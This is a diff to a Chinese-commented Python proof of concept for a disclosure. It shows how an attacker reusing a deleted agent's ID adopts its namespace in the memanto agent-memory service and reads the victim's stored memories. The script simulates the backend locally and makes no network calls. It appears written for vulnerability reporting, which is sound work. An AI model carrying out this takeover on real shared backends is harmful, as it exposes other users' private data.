@@ -9,7 +9,7 @@ PoC #1 — 租户隔离破坏：重建 Agent 静默接管已存在的 Moorcheh n
 
 攻击链路（全部为本地代码逻辑模拟，不打线上）：
   1. 受害者 User A 创建 agent "alice"，在 Moorcheh 中拥有 namespace
-     "memanto_agent_alice"，其中存有敏感记忆。
+     "memanto_agent_alice"，并通过正常写入接口存入敏感记忆。
   2. User A 删除本地 agent（默认保留 Moorcheh namespace，见
      sessions.py:151-196 与 cli/commands/agent.py:181 的 default=True）。
   3. 攻击者 User B 用相同的 agent_id "alice" 再次调用 create_agent：
@@ -19,11 +19,15 @@ PoC #1 — 租户隔离破坏：重建 Agent 静默接管已存在的 Moorcheh n
   4. B 调用 activate → 得到 session_token → recall/remember 直接读写
      A 的全部记忆。
 
+租户边界说明：本 PoC 展示的是"共享 Moorcheh 后端"（服务端单一
+MOORCHEH_API_KEY，或共享 on-prem Moorcheh 实例）内的跨用户/跨机器接管；
+不声称可跨越互不共享后端数据的独立 Moorcheh 账号。
+
 本脚本不依赖 memanto 包与网络：用 stdlib 精确复刻上述控制流，
-并用一个 FakeMoorcheh 模拟后端行为。可 `python poc_01_namespace_adoption.py` 直接运行。
+并用一个共享的 FakeMoorcheh 模拟后端行为（从空库开始，由 User A
+显式写入记忆）。可 `python poc_01_namespace_adoption.py` 直接运行。
 """
 
-import json
 import uuid
 from datetime import datetime, timezone
 
@@ -35,28 +39,22 @@ def agent_namespace(agent_id: str) -> str:
 
 
 # ---------------------------------------------------------------------------
-# 2) Fake Moorcheh 后端 —— 模拟"namespace 已存在"的云端行为
+# 2) Fake Moorcheh 后端 —— 共享实例，模拟"namespace 已存在"的云端行为
 # ---------------------------------------------------------------------------
 class ConflictError(Exception):
     """对应 moorcheh_sdk.exceptions.ConflictError"""
 
 
 class FakeMoorcheh:
-    """最小 Moorcheh 客户端：namespace 归属性不做任何校验（与云端一致）。"""
+    """最小 Moorcheh 客户端：namespace 归属不做任何校验（与云端一致）。
+
+    从空库开始；User A 的写入通过 documents().upload() 显式完成，
+    以完整展示"创建 → 写数据 → 删除 → 被接管"的真实生命周期。
+    """
 
     def __init__(self, api_key: str):
         self.api_key = api_key
-        # namespace_name -> {"owner": 谁的 key 创建的, "docs": {id: text}}
         self.namespaces_db: dict[str, dict] = {}
-        # 受害者 User A 的 key 先创建了 alice 的 namespace 并写了敏感记忆
-        self.namespaces_db["memanto_agent_alice"] = {
-            "owner": "victim-key",
-            "docs": {
-                "mem-1": "[FACT] 受害者银行账户\n\n"
-                         "账号 6222-xxxx-xxxx-1234，余额 98 万元，"
-                         "常用密码 qwerty-not-real",
-            },
-        }
 
     def namespaces(self):
         class NS:
@@ -114,21 +112,23 @@ class FakeMoorcheh:
 
 # ---------------------------------------------------------------------------
 # 3) 复刻 memanto/app/services/agent_service.py:57-127 的 create_agent 核心逻辑
+#    （共享 backend 注入，与生产一致：所有操作打到同一个 Moorcheh 账号）
 # ---------------------------------------------------------------------------
 class AgentServiceSim:
     """本地 agents 元数据目录（模拟 ~/.memanto/agents/）。"""
 
-    def __init__(self):
+    def __init__(self, backend: FakeMoorcheh):
+        self.backend = backend
         self.agents_dir: dict[str, dict] = {}   # agent_id -> metadata
 
-    def create_agent(self, agent_create, moorcheh_api_key) -> dict:
+    def create_agent(self, agent_create) -> dict:
         agent_id = agent_create["agent_id"]
         # 对应 agent_service.py:73-77 —— 只检查本地文件是否存在
         if agent_id in self.agents_dir:
             raise Exception(f"Agent '{agent_id}' already exists")
 
         namespace = agent_namespace(agent_id)           # core.py:80-82
-        client = FakeMoorcheh(api_key=moorcheh_api_key)
+        client = self.backend                          # 生产：get_moorcheh_client()
 
         # 对应 agent_service.py:100-114 —— 关键缺陷：已存在 → 当作成功
         try:
@@ -163,7 +163,7 @@ class AgentServiceSim:
 # ---------------------------------------------------------------------------
 # 4) 复刻 sessions.py:206-248 的 activate + memory.py 的 recall 最小链路
 # ---------------------------------------------------------------------------
-def activate(svc: AgentServiceSim, agent_id: str, backend: FakeMoorcheh):
+def activate(svc: AgentServiceSim, agent_id: str):
     """对应 POST /api/v2/agents/{agent_id}/activate —— 不校验 namespace 归属。"""
     agent = svc.agents_dir.get(agent_id)
     if not agent:
@@ -181,37 +181,48 @@ def recall_all(session: dict, backend: FakeMoorcheh):
 
 
 # ---------------------------------------------------------------------------
-# 5) 攻击演示
+# 5) 攻击演示：共享后端从空库开始，完整生命周期
 # ---------------------------------------------------------------------------
 def main():
     print("=" * 72)
-    print("PoC #1: 重建 agent 接管既有 namespace（租户隔离破坏）")
+    print("PoC #1: 重建 agent 接管既有 namespace（共享后端内的跨用户接管）")
     print("=" * 72)
 
-    backend = FakeMoorcheh("server-key")     # 服务端唯一 Moorcheh 账号
-    svc = AgentServiceSim()
+    # 服务端唯一的 Moorcheh 账号：A、B 的所有操作都打到这同一个后端
+    backend = FakeMoorcheh("server-key")
+    svc = AgentServiceSim(backend)
 
-    print("\n[Step 1] User A 创建 agent 'alice' 并写入敏感记忆（模拟）")
-    alice = svc.create_agent({"agent_id": "alice"}, "server-key")
+    print("\n[Step 1] User A 创建 agent 'alice'")
+    alice = svc.create_agent({"agent_id": "alice"})
 
-    print("\n[Step 2] User A 删除本地 agent（默认保留 Moorcheh namespace）")
+    print("\n[Step 2] User A 写入敏感记忆（经正常写入接口）")
+    backend.documents().upload("memanto_agent_alice", [
+        {"id": "mem-1", "text": "[FACT] 受害者银行账户\n\n"
+                                "账号 6222-xxxx-xxxx-1234，余额 98 万元，"
+                                "常用密码 qwerty-not-real"},
+    ])
+    print("    -> A 的记忆已写入 namespace 'memanto_agent_alice'")
+
+    print("\n[Step 3] User A 删除本地 agent（默认保留 Moorcheh namespace）")
     svc.delete_agent("alice", delete_backup_too=False)
 
-    print("\n[Step 3] 攻击者 User B 用相同 agent_id 重新创建 agent")
-    bob = svc.create_agent({"agent_id": "alice"}, "server-key")
-    print(f"    -> B 成功创建 agent（应该被拒绝，但没有）")
+    print("\n[Step 4] 攻击者 User B 用相同 agent_id 重新创建 agent")
+    bob = svc.create_agent({"agent_id": "alice"})
+    print("    -> B 成功创建 agent（应该被拒绝，但没有）")
 
-    print("\n[Step 4] User B 激活 agent 并召回全部记忆")
-    session = activate(svc, "alice", backend)
+    print("\n[Step 5] User B 激活 agent 并召回全部记忆")
+    session = activate(svc, "alice")
     memories = recall_all(session, backend)
     print(f"    -> B 读到 {len(memories)} 条记忆：")
     for m in memories:
         print("      " + m["text"].replace("\n", " | "))
 
     print("\n[RESULT] 攻击者 B 在没有任何 User A 凭证的情况下，")
-    print("         读到了 A 的 namespace 中的全部记忆。")
+    print("         读到了 A 写入的全部记忆。")
     print("         根因: agent_service.py:107-114 将 'namespace 已存在'")
     print("         当作成功，且 activate 链路无归属校验。")
+    print("         边界: 同一共享 Moorcheh 后端内的跨用户/跨机器接管；")
+    print("         不声称跨独立 Moorcheh 账号访问。")
     return 0
 
 
